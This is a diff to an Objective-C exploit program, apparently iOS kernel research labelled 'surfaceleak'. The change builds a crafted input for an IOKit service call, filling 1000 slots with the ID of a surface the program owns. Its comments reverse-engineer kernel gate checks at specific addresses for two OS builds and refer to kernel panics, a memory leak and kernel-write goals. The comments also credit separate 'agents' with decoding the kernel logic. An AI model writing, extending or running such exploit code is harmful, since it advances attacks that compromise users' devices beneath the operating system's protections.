@@ -32,7 +32,7 @@
 #import "LabLocalTime.h"
 #import "LabRuntimeOffsets.h"
 
-#define P114_BUILD @"p114-surfaceleak-v1.5-openretry"
+#define P114_BUILD @"p114-surfaceleak-v1.10-contractv5"
 
 #import <Foundation/Foundation.h>
 #import <CoreFoundation/CoreFoundation.h>
@@ -105,6 +105,8 @@ static IOReturn (*g_p114_objRelease)(io_object_t);
 typedef struct __IOSurface *p114_SurfaceRef;
 static p114_SurfaceRef (*g_p114_surfCreate)(CFDictionaryRef);
 static void (*g_p114_surfRel)(void *);
+static uint32_t (*g_p114_surfID)(void *);   /* v1.10: IOSurfaceGetID (the
+   p110 sibling's proven dlsym) — the v5 tags contract needs the sid */
 
 static io_service_t g_p114_svc;
 static io_connect_t g_p114_conn;
@@ -126,6 +128,7 @@ static BOOL p114_dlsym(void) {
     void *ios = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
     if (!ios) ios = RTLD_DEFAULT;
     g_p114_surfCreate = (p114_SurfaceRef (*)(CFDictionaryRef))dlsym(ios, "IOSurfaceCreate");
+    g_p114_surfID     = (uint32_t (*)(void *))dlsym(ios, "IOSurfaceGetID");   /* v1.10 */
     g_p114_surfRel    = (void (*)(void *))dlsym(RTLD_DEFAULT, "CFRelease");
     return g_p114_match && g_p114_getsvc && g_p114_open && g_p114_callStruct;
 }
@@ -240,36 +243,58 @@ static void p114_hexdump(size_t maxn) {
         uint32_t qsz = 0xFA8u;
         static uint8_t qBuf[0xFA8];
         memset(qBuf, 0, sizeof(qBuf));
-        /* v1.3 CONTENT LAW (byte-verified on BOTH on-disk builds, 2026-10-27):
-           the sel-6 builder's tail gate reads the input byte at in+0xFA4 and
-           requires bit0 SET (tbnz w9,#0 -> real builder; bit0=0 -> ret 2c2).
-           23F77: tail 0x8a64490; 24A435: tail 0x90dcd28. The front gate
-           (in-struct 0xfa8 + first u32 <= 0x3e8, zeros pass) is identical:
-           23F77 0x8a31f58/0xa31f64, 24A435 0x909b2f8/0xb304. Tonight's device
-           2c2 (outLen=4008 echoed) = exactly this bit absent. */
-        qBuf[0xFA4] = 0x01;
-        /* v1.4 PHASE LAW (byte-verified 24A435 0x909b2e8-family, 2026-10-27):
-           the 4-phase builder's phases 1..3 each require in[0] > 1 (else
-           2bd+5 = 2c2) and pass (count=2, in+4) to the shared factory
-           (0x908f9d4) which instantiates TWO objects per phase via the
-           IOSurface-kext create stub (GOT 0x81153e0 -> 0xa344130 on
-           24A435). Phase 0 (0x908f5ec) reads in[0] itself (0x908f664) and
-           walks u32 tags post-increment (0x908f6cc [x1],#4). So in[0] =
-           the object count, legal window (front gate <= 0x3e8 AND phases
-           > 1) -> 2. Tags at in[4]/in[8] = the factory params (tagn 0 =
-           first device probe value; the factory's own enum decides). */
-        *(uint32_t *)(void *)qBuf = 0x2;          /* word0 = count 2        */
-        *(uint32_t *)(void *)(qBuf + 4) = 0x0;    /* tag1 (factory param)   */
-        *(uint32_t *)(void *)(qBuf + 8) = 0x0;    /* tag2 (factory param)   */
+        /* v1.10 CONTRACT v5 (the grammar agent's full decode, 2026-10-28; the
+           static agent resolved the whole phase0 + factory chain):
+           in = {u32 0x3e8 (=1000); u32 sids[1000]; u32 flags} — structurally
+           closed: 4 + 1000*4 = 0xFA4 tag area + the flag word = 0xFA8.
+           - word0 must be EXACTLY 0x3e8: phase0 requires in[0] > 0x3e7
+             (24A435 0x908f698 cmp w22,#0x3e7; b.hi, else 2bd+5=2c2) AND the
+             front gate requires <= 0x3e8 — the only legal value is 1000.
+             (The v1.4 "count=2" reading was WRONG: phase0's 2c2 vs phases'
+             checks bound the SAME word0 from both sides.)
+           - tags[i] = REAL LIVE IOSurface SIDs OWNED BY THE CALLING TASK
+             (factory = IOSurface root's SID lookup; entry fClientTask ==
+             current_task check; "IOCoreSurfaceRoot"). Kernel-assigned
+             values from creating real surfaces in-process; zeros = NULL ->
+             2c2 (all of tonight's runs), foreign sids = the "failed global"
+             panic ladder. v5's repetition note: one valid SID in all 1000
+             slots appears structurally permitted (erase-then-recreate per
+             iteration) — the single-sid fill is this build; the honest note
+             is that repetition needs this device test to confirm.
+           - in[0xFA4] bit0 = 1 (byte-verified both builds, note 274).
+           Device evidence this explains: every zeros/count2/tag0 run = 2c2
+           exactly at the phase0/sid-law, and panic-note-275's spill table
+           sids = staging-class surface SIDs (the same SID universe). */
+        p114_SurfaceRef qs = p114_mk_surface();   /* the one owned surface   */
+        uint32_t qs_sid = 0;
+        if (g_p114_surfID) qs_sid = g_p114_surfID((void *)qs);
+        if (!qs || !qs_sid) {
+            Lf(@"[-] QueueCreate HOLD (no-guess law): IOSurfaceCreate/GetID "
+               @"unavailable — cannot build the v5 tags contract; honest stop.");
+            if (qs && g_p114_surfRel) g_p114_surfRel(qs);
+            goto v5_stop;
+        }
+        *(uint32_t *)(void *)qBuf = 0x3e8;              /* word0 = 1000      */
+        for (int ti = 0; ti < 1000; ti++)
+            *(uint32_t *)(void *)(qBuf + 4 + ti * 4) = qs_sid;  /* tags[i]   */
+        qBuf[0xFA4] = 0x01;                             /* the flag word bit0 */
+        Lf(@"[*] v5 contract: word0=0x3e8 (1000 tags of sid=0x%08x) + in[0xFA4]=1",
+           qs_sid);
         size_t qOutLen = sizeof(qBuf);
         uint64_t qOut[4] = {0};
         kern_return_t krQ = g_p114_callStruct(g_p114_conn, 6, qBuf, qsz, qOut, &qOutLen);
         g_p114_qh = qOut[0];
         g_p114_queued = YES;
-        Lf(@"[*] QueueCreate sel=6 stIn=0x%x (dispatch-row law: 0xfa8 both builds; "
-           @"v1.3 content law: in[0xFA4] bit0=1) "
+        if (qs && g_p114_surfRel) g_p114_surfRel(qs);   /* the kext holds its own refs */
+        Lf(@"[*] QueueCreate sel=6 stIn=0x%x (v5 contract: {1000, sids[1000], flags}) "
            @"kr=0x%x outLen=%zu out0=%016llx (the {u64} input candidate)",
            qsz, krQ, qOutLen, (unsigned long long)qOut[0]);
+        goto v5_after;
+    v5_stop:
+        L(@"[pairing note stays] p110's leakgate-on arm HOLDS honestly until this "
+          @"law fires; no QueueCreate was sent.");
+        goto v5_end;
+    v5_after:;
 
         /* ---- the N captures ---- */
         int caps_ok = 0, caps_held = 0;
@@ -381,6 +406,7 @@ static void p114_hexdump(size_t maxn) {
           @"hasKwrite=NO. One tap per force-quit; the door is left open (P027/P098 "
           @"delayed-teardown law).");
     }
+v5_end:;
 
 finish:
     if (g_p114_fd >= 0) { (void)fcntl(g_p114_fd, F_FULLFSYNC); (void)close(g_p114_fd); g_p114_fd = -1; }
